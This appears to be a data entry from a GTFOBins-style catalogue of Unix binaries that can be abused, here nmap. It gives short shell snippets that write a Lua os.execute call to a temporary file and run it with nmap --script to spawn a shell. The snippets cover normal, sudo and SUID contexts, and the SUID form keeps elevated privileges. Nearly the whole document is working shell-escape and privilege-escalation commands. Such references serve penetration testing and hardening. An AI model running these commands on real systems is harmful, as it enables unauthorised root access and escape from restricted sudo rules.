---
functions:
  execute-interactive:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        nmap --script=$TF
  sudo-enabled:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        sudo nmap --script=$TF
  suid-enabled:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh -p")' > $TF
        ./nmap --script=$TF
---
